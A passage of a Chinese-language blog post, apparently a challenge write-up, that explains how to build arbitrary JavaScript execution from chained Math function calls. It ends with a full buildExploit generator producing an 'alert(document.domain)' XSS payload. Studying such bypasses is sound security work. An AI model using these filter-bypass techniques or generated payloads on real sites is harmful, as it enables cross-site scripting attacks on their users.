punctuation">[</span><span class="token punctuation">]</span>Math<span class="token punctuation">.</span>seeds<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span>Math<span class="token punctuation">.</span>log<span class="token punctuation">.</span>name<span class="token punctuation">.</span><span class="token function">at</span><span class="token punctuation">(</span>Math<span class="token punctuation">.</span><span class="token constant">LN2</span><span class="token punctuation">.</span><span class="token function">valueOf</span><span class="token punctuation">(</span>Math<span class="token punctuation">.</span>seeds<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span>Math<span class="token punctuation">.</span>abs<span class="token punctuation">.</span>name<span class="token punctuation">.</span><span class="token function">at</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>就能讓陣列的內容變成 <code>[&#39;a&#39;, &#39;l&#39;]</code>。</p><p>以此類推，我們可以多準備一點 index，我準備了四個：</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">const</span> mapping <span class="token operator">=</span> <span class="token punctuation">[</span>  <span class="token punctuation">[</span><span class="token string">'Math.LN2.valueOf'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token comment">// 0</span>  <span class="token punctuation">[</span><span class="token string">'Math.LOG2E.valueOf'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token comment">// 1</span>  <span class="token punctuation">[</span><span class="token string">'Math.E.valueOf'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token comment">// 2</span>  <span class="token punctuation">[</span><span class="token string">'Math.PI.valueOf'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token comment">// 3</span><span class="token punctuation">]</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>做到這邊，我們需要的英文字母應該都能找到了，那符號呢？像是 <code>()</code>，這該怎麼辦呢？</p><p>這時就需要回想起來有一個很好用的 <a href="https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/String/fromCharCode">String.fromCharCode()</a>，只要給它數字，就能夠轉成字串。</p><p>要從 <code>Math</code> 存取到 <code>String</code> 也很簡單，先找到任何一個字串以後存取它的 constructor 就好：<code>Math.abs.name.constructor.fromCharCode</code></p><p>於是接下來的問題就變成，那要怎麼產生數字？</p><p>都已經用 Math 了，那就寫一個搜尋的函式嘗試各種 Math 函式的組合吧！</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">function</span> <span class="token function">findTargetNumber</span><span class="token punctuation">(</span><span class="token parameter">init<span class="token punctuation">,</span> target</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  <span class="token keyword">let</span> queue <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">[</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">,</span> init<span class="token punctuation">]</span><span class="token punctuation">]</span>  <span class="token keyword">let</span> visited <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Set</span><span class="token punctuation">(</span><span class="token punctuation">)</span>  <span class="token keyword">return</span> <span class="token function">bfs</span><span class="token punctuation">(</span>target<span class="token punctuation">)</span>  <span class="token keyword">function</span> <span class="token function">bfs</span><span class="token punctuation">(</span><span class="token parameter">target</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">while</span><span class="token punctuation">(</span>queue<span class="token punctuation">.</span>length<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>      <span class="token keyword">let</span> <span class="token punctuation">[</span>path<span class="token punctuation">,</span> current<span class="token punctuation">]</span> <span class="token operator">=</span> queue<span class="token punctuation">.</span><span class="token function">shift</span><span class="token punctuation">(</span><span class="token punctuation">)</span>      <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">let</span> key <span class="token keyword">of</span> Object<span class="token punctuation">.</span><span class="token function">getOwnPropertyNames</span><span class="token punctuation">(</span>Math<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">typeof</span> Math<span class="token punctuation">[</span>key<span class="token punctuation">]</span> <span class="token operator">!==</span> <span class="token string">'function'</span><span class="token punctuation">)</span> <span class="token keyword">continue</span>        <span class="token keyword">let</span> value <span class="token operator">=</span> Math<span class="token punctuation">[</span>key<span class="token punctuation">]</span><span class="token operator">?.</span><span class="token punctuation">(</span>current<span class="token punctuation">)</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>value <span class="token operator">&amp;&amp;</span> <span class="token operator">!</span>Number<span class="token punctuation">.</span><span class="token function">isNaN</span><span class="token punctuation">(</span>value<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>          <span class="token keyword">let</span> newPath <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">Math.</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>key<span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token template-punctuation string">`</span></span><span class="token punctuation">,</span> <span class="token operator">...</span>path<span class="token punctuation">]</span>          <span class="token keyword">if</span> <span class="token punctuation">(</span>value <span class="token operator">===</span> target<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">return</span> newPath          <span class="token punctuation">&#125;</span>          <span class="token keyword">if</span> <span class="token punctuation">(</span>newPath<span class="token punctuation">.</span>length <span class="token operator">>=</span> <span class="token number">10</span><span class="token punctuation">)</span> <span class="token keyword">return</span>          <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>visited<span class="token punctuation">.</span><span class="token function">has</span><span class="token punctuation">(</span>value<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            visited<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span>value<span class="token punctuation">)</span>            queue<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span><span class="token punctuation">[</span>newPath<span class="token punctuation">,</span> value<span class="token punctuation">]</span><span class="token punctuation">)</span>          <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span>      <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>  <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token function">findTargetNumber</span><span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">,</span> <span class="token string">'('</span><span class="token punctuation">.</span><span class="token function">charCodeAt</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment">// ['Math.floor', 'Math.log2', 'Math.cosh', 'Math.clz32']</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>當我們拼出 <code>alert</code> 時，最後一個 push 的回傳值會是 5，而 ( 的 ASCII code 是 40，我們只要這樣做就能得到 40：<code>Math.floor(Math.log2(Math.cosh(Math.clz32(5))))</code></p><p>跟前面的程式碼拼接一下，就能得到 <code>(</code>：</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript">Math<span class="token punctuation">.</span>abs<span class="token punctuation">.</span>name<span class="token punctuation">.</span>constructor<span class="token punctuation">.</span><span class="token function">fromCharCode</span><span class="token punctuation">(</span>Math<span class="token punctuation">.</span><span class="token function">floor</span><span class="token punctuation">(</span>Math<span class="token punctuation">.</span><span class="token function">log2</span><span class="token punctuation">(</span>Math<span class="token punctuation">.</span><span class="token function">cosh</span><span class="token punctuation">(</span>Math<span class="token punctuation">.</span><span class="token function">clz32</span><span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>把這些整合起來，就能組成一個有我們想要的字元的陣列。</p><h2><span id="3-怎麼-join">3. 怎麼 join？</span></h2><p>要把陣列 join 起來，我們需要找到空字串，才能把陣列變成我們想要的字串。</p><p>我一開始的想法是組出空白字元以後用 <code>&quot; &quot;.trim()</code>，但是空白字元也是經由別的函式拼出來的，會變成：<code>fn().trim()</code>，就違反了題目設定的規則。</p><p>幸好，還有另一種方式可以呼叫函式：<code>String.prototype.trim.call(&quot; &quot;)</code>，這樣也能拿到空字串。</p><p>我們可以利用前面找出 <code>(</code> 的方法找到空白字元，最後再加上這一連串的呼叫即可，範例如下：</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token comment">// 假設我們已經有想要的陣列了</span><span class="token keyword">var</span> arr <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'a'</span><span class="token punctuation">,</span><span class="token string">'l'</span><span class="token punctuation">,</span><span class="token string">'e'</span><span class="token punctuation">,</span><span class="token string">'r'</span><span class="token punctuation">,</span><span class="token string">'t'</span><span class="token punctuation">,</span><span class="token string">'('</span><span class="token punctuation">,</span><span class="token string">')'</span><span class="token punctuation">]</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>  arr<span class="token punctuation">.</span><span class="token function">join</span><span class="token punctuation">(</span>Math<span class="token punctuation">.</span>abs<span class="token punctuation">.</span>name<span class="token punctuation">.</span>constructor<span class="token punctuation">.</span>prototype<span class="token punctuation">.</span><span class="token function">trim</span><span class="token punctuation">.</span><span class="token function">call</span><span class="token punctuation">(</span>Math<span class="token punctuation">.</span>abs<span class="token punctuation">.</span>name<span class="token punctuation">.</span>constructor<span class="token punctuation">.</span><span class="token function">fromCharCode</span><span class="token punctuation">(</span><span class="token number">32</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment">// alert()</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2><span id="4-怎麼不用-eval-來執行">4. 怎麼不用 eval 來執行？</span></h2><p>除了 <code>eval</code> 以外，還有 function constructor 可以用，像是這樣：</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token function">Function</span><span class="token punctuation">(</span><span class="token string">'alert()'</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><code>Function</code> 的部分只要找到任何一個函式並且存取它的 constructor 即可：</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript">Math<span class="token punctuation">.</span>abs<span class="token punctuation">.</span><span class="token function">constructor</span><span class="token punctuation">(</span><span class="token string">'alert()'</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>那最後的 <code>()</code> 該怎麼辦呢？</p><p>跟剛剛一樣，我們可以用另一種方式呼叫函式，例如說 <code>alert.call()</code> 又可以寫成是 <code>Function.prototype.call.call(alert)</code>，因此我們要的程式碼如下：</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript">Math<span class="token punctuation">.</span>abs<span class="token punctuation">.</span>constructor<span class="token punctuation">.</span><span class="token function">call</span><span class="token punctuation">.</span><span class="token function">call</span><span class="token punctuation">(</span>Math<span class="token punctuation">.</span>abs<span class="token punctuation">.</span><span class="token function">constructor</span><span class="token punctuation">(</span><span class="token string">'alert()'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2><span id="5-拼裝起來">5. 拼裝起來</span></h2><p>我寫了一個 script 來產生程式碼，完整程式碼如下：</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">function</span> <span class="token function">findTargetFromScope</span><span class="token punctuation">(</span>scope<span class="token punctuation">,</span> matchFn<span class="token punctuation">,</span> initPath<span class="token operator">=</span><span class="token string">''</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  <span class="token keyword">let</span> visited <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Set</span><span class="token punctuation">(</span><span class="token punctuation">)</span>  <span class="token keyword">let</span> result <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>  <span class="token function">findTarget</span><span class="token punctuation">(</span>scope<span class="token punctuation">,</span> initPath<span class="token punctuation">)</span>  <span class="token comment">// return the shortest one</span>  <span class="token keyword">return</span> result<span class="token punctuation">.</span><span class="token function">sort</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token parameter">a<span class="token punctuation">,</span> b</span><span class="token punctuation">)</span> <span class="token operator">=></span> a<span class="token punctuation">.</span>length <span class="token operator">-</span> b<span class="token punctuation">.</span>length<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>  <span class="token keyword">function</span> <span class="token function">findTarget</span><span class="token punctuation">(</span><span class="token parameter">obj<span class="token punctuation">,</span> path</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>visited<span class="token punctuation">.</span><span class="token function">has</span><span class="token punctuation">(</span>obj<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token keyword">return</span>    visited<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span>obj<span class="token punctuation">)</span>    <span class="token keyword">const</span> list <span class="token operator">=</span> Object<span class="token punctuation">.</span><span class="token function">getOwnPropertyNames</span><span class="token punctuation">(</span>obj<span class="token punctuation">)</span>    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">let</span> key <span class="token keyword">of</span> list<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>      <span class="token keyword">const</span> item <span class="token operator">=</span> obj<span class="token punctuation">[</span>key<span class="token punctuation">]</span>      <span class="token keyword">const</span> newPath <span class="token operator">=</span> path <span class="token operator">?</span> path <span class="token operator">+</span> <span class="token string">"."</span> <span class="token operator">+</span> key <span class="token operator">:</span> key      <span class="token keyword">try</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">matchFn</span><span class="token punctuation">(</span>item<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>          result<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span>newPath<span class="token punctuation">)</span>          <span class="token keyword">continue</span>        <span class="token punctuation">&#125;</span>      <span class="token punctuation">&#125;</span> <span class="token keyword">catch</span><span class="token punctuation">(</span>err<span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span>item <span class="token operator">&amp;&amp;</span> <span class="token keyword">typeof</span> item <span class="token operator">===</span> <span class="token string">'object'</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token function">findTarget</span><span class="token punctuation">(</span>item<span class="token punctuation">,</span> newPath<span class="token punctuation">)</span>      <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>  <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">function</span> <span class="token function">findTargetNumber</span><span class="token punctuation">(</span><span class="token parameter">init<span class="token punctuation">,</span> target</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  <span class="token keyword">let</span> queue <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">[</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">,</span> init<span class="token punctuation">]</span><span class="token punctuation">]</span>  <span class="token keyword">let</span> visited <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Set</span><span class="token punctuation">(</span><span class="token punctuation">)</span>  <span class="token keyword">return</span> <span class="token function">bfs</span><span class="token punctuation">(</span>target<span class="token punctuation">)</span>  <span class="token keyword">function</span> <span class="token function">bfs</span><span class="token punctuation">(</span><span class="token parameter">target</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">while</span><span class="token punctuation">(</span>queue<span class="token punctuation">.</span>length<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>      <span class="token keyword">let</span> <span class="token punctuation">[</span>path<span class="token punctuation">,</span> current<span class="token punctuation">]</span> <span class="token operator">=</span> queue<span class="token punctuation">.</span><span class="token function">shift</span><span class="token punctuation">(</span><span class="token punctuation">)</span>      <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">let</span> key <span class="token keyword">of</span> Object<span class="token punctuation">.</span><span class="token function">getOwnPropertyNames</span><span class="token punctuation">(</span>Math<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">typeof</span> Math<span class="token punctuation">[</span>key<span class="token punctuation">]</span> <span class="token operator">!==</span> <span class="token string">'function'</span><span class="token punctuation">)</span> <span class="token keyword">continue</span>        <span class="token keyword">let</span> value <span class="token operator">=</span> Math<span class="token punctuation">[</span>key<span class="token punctuation">]</span><span class="token operator">?.</span><span class="token punctuation">(</span>current<span class="token punctuation">)</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>value <span class="token operator">&amp;&amp;</span> <span class="token operator">!</span>Number<span class="token punctuation">.</span><span class="token function">isNaN</span><span class="token punctuation">(</span>value<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>          <span class="token keyword">let</span> newPath <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">Math.</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>key<span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token template-punctuation string">`</span></span><span class="token punctuation">,</span> <span class="token operator">...</span>path<span class="token punctuation">]</span>          <span class="token keyword">if</span> <span class="token punctuation">(</span>value <span class="token operator">===</span> target<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">return</span> newPath          <span class="token punctuation">&#125;</span>          <span class="token keyword">if</span> <span class="token punctuation">(</span>newPath<span class="token punctuation">.</span>length <span class="token operator">>=</span> <span class="token number">10</span><span class="token punctuation">)</span> <span class="token keyword">return</span>          <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>visited<span class="token punctuation">.</span><span class="token function">has</span><span class="token punctuation">(</span>value<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            visited<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span>value<span class="token punctuation">)</span>            queue<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span><span class="token punctuation">[</span>newPath<span class="token punctuation">,</span> value<span class="token punctuation">]</span><span class="token punctuation">)</span>          <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span>      <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>  <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">function</span> <span class="token function">buildExploit</span><span class="token punctuation">(</span><span class="token parameter">arrName<span class="token punctuation">,</span> content</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  <span class="token keyword">let</span> ans <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>  <span class="token keyword">let</span> currentIndex <span class="token operator">=</span> <span class="token number">0</span>  <span class="token keyword">let</span> codeResult <span class="token operator">=</span> <span class="token string">''</span>  <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">let</span> i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span> i<span class="token operator">&lt;</span><span class="token number">5</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token function">addFunction</span><span class="token punctuation">(</span><span class="token template-string"><span class="token template-punctuation string">`</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>arrName<span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token string">.pop</span><span class="token template-punctuation string">`</span></span><span class="token punctuation">)</span>  <span class="token punctuation">&#125;</span>  <span class="token keyword">const</span> <span class="token function-variable function">findMathName</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token parameter">index<span class="token punctuation">,</span> char</span><span class="token punctuation">)</span> <span class="token operator">=></span>     <span class="token function">findTargetFromScope</span><span class="token punctuation">(</span>Math<span class="token punctuation">,</span> <span class="token parameter">item</span> <span class="token operator">=></span> item<span class="token punctuation">.</span>name<span class="token punctuation">.</span><span class="token function">at</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span> <span class="token operator">===</span> char<span class="token punctuation">,</span> <span class="token string">'Math'</span><span class="token punctuation">)</span>    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">let</span> char <span class="token keyword">of</span> content<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token comment">// if we can find it in the Math for the current index, use it</span>    <span class="token keyword">let</span> result <span class="token operator">=</span> <span class="token function">findMathName</span><span class="token punctuation">(</span>currentIndex<span class="token punctuation">,</span> char<span class="token punctuation">)</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>result<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>      <span class="token function">addFunction</span><span class="token punctuation">(</span><span class="token template-string"><span class="token template-punctuation string">`</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>result<span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token string">.name.at</span><span class="token template-punctuation string">`</span></span><span class="token punctuation">)</span>      <span class="token function">addFunction</span><span class="token punctuation">(</span><span class="token template-string"><span class="token template-punctuation string">`</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>arrName<span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token string">.push</span><span class="token template-punctuation string">`</span></span><span class="token punctuation">)</span>      currentIndex<span class="token operator">++</span>      <span class="token keyword">continue</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">const</span> mapping <span class="token operator">=</span> <span class="token punctuation">[</span>      <span class="token punctuation">[</span><span class="token string">'Math.LN2.valueOf'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token comment">// 0</span>      <span class="token punctuation">[</span><span class="token string">'Math.LOG2E.valueOf'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token comment">// 1</span>      <span class="token punctuation">[</span><span class="token string">'Math.E.valueOf'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token comment">// 2</span>      <span class="token punctuation">[</span><span class="token string">'Math.PI.valueOf'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token comment">// 3</span>    <span class="token punctuation">]</span>    <span class="token comment">// try to find Math.fn[i] == char</span>    <span class="token keyword">let</span> found <span class="token operator">=</span> <span class="token boolean">false</span>    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">let</span> i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span> i<span class="token operator">&lt;</span>mapping<span class="token punctuation">.</span>length<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>      result <span class="token operator">=</span> <span class="token function">findMathName</span><span class="token punctuation">(</span>i<span class="token punctuation">,</span> char<span class="token punctuation">)</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span>result<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token function">addFunction</span><span class="token punctuation">(</span>mapping<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span>        <span class="token function">addFunction</span><span class="token punctuation">(</span><span class="token template-string"><span class="token template-punctuation string">`</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>result<span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token string">.name.at</span><span class="token template-punctuation string">`</span></span><span class="token punctuation">)</span>        <span class="token function">addFunction</span><span class="token punctuation">(</span><span class="token template-string"><span class="token template-punctuation string">`</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>arrName<span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token string">.push</span><span class="token template-punctuation string">`</span></span><span class="token punctuation">)</span>        currentIndex<span class="token operator">++</span>        found <span class="token operator">=</span> <span class="token boolean">true</span>        <span class="token keyword">break</span>      <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>found<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>      <span class="token keyword">continue</span>    <span class="token punctuation">&#125;</span>    <span class="token comment">// if we can't, we use integer to make a string</span>    <span class="token keyword">let</span> mathResult <span class="token operator">=</span> <span class="token function">findTargetNumber</span><span class="token punctuation">(</span>currentIndex<span class="token punctuation">,</span> char<span class="token punctuation">.</span><span class="token function">charCodeAt</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    mathResult<span class="token punctuation">.</span><span class="token function">reverse</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment">// remember to reverse cause the order</span>    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">let</span> row <span class="token keyword">of</span> mathResult<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>      <span class="token function">addFunction</span><span class="token punctuation">(</span>row<span class="token punctuation">)</span>    <span class="token punctuation">&#125;</span>    <span class="token function">addFunction</span><span class="token punctuation">(</span><span class="token string">'Math.abs.name.constructor.fromCharCode'</span><span class="token punctuation">)</span>    <span class="token function">addFunction</span><span class="token punctuation">(</span><span class="token template-string"><span class="token template-punctuation string">`</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>arrName<span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token string">.push</span><span class="token template-punctuation string">`</span></span><span class="token punctuation">)</span>    currentIndex<span class="token operator">++</span>  <span class="token punctuation">&#125;</span>  <span class="token comment">// add eval structure</span>  <span class="token comment">// generate space then trim</span>  <span class="token keyword">let</span> spaceResult <span class="token operator">=</span> <span class="token function">findTargetNumber</span><span class="token punctuation">(</span>currentIndex<span class="token punctuation">,</span> <span class="token string">' '</span><span class="token punctuation">.</span><span class="token function">charCodeAt</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span>  spaceResult<span class="token punctuation">.</span><span class="token function">reverse</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment">// remember to reverse cause the order</span>  <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">let</span> row <span class="token keyword">of</span> spaceResult<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token function">addFunction</span><span class="token punctuation">(</span>row<span class="token punctuation">)</span>  <span class="token punctuation">&#125;</span>  <span class="token function">addFunction</span><span class="token punctuation">(</span><span class="token string">'Math.abs.name.constructor.fromCharCode'</span><span class="token punctuation">)</span>  <span class="token function">addFunction</span><span class="token punctuation">(</span><span class="token string">'Math.abs.name.constructor.prototype.trim.call'</span><span class="token punctuation">)</span>  <span class="token function">addFunction</span><span class="token punctuation">(</span><span class="token template-string"><span class="token template-punctuation string">`</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>arrName<span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token string">.join</span><span class="token template-punctuation string">`</span></span><span class="token punctuation">)</span>  <span class="token function">addFunction</span><span class="token punctuation">(</span><span class="token string">'Math.abs.constructor'</span><span class="token punctuation">)</span>  <span class="token function">addFunction</span><span class="token punctuation">(</span><span class="token string">'Math.abs.constructor.prototype.call.call'</span><span class="token punctuation">)</span>  <span class="token keyword">return</span> ans<span class="token punctuation">.</span><span class="token function">reverse</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">join</span><span class="token punctuation">(</span><span class="token string">','</span><span class="token punctuation">)</span>  <span class="token comment">//return codeResult</span>  <span class="token keyword">function</span> <span class="token function">addFunction</span><span class="token punctuation">(</span><span class="token parameter">name</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    ans<span class="token punctuation">.</span><span class="token function">unshift</span><span class="token punctuation">(</span>name<span class="token punctuation">)</span>    codeResult <span class="token operator">=</span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>name<span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token string">(</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>codeResult<span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token string">)</span><span class="token template-punctuation string">`</span></span>  <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token function">buildExploit</span><span class="token punctuation">(</span><span class="token string">'Math.seeds'</span><span class="token punctuation">,</span> <span class="token string">'alert(document.domain)'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" 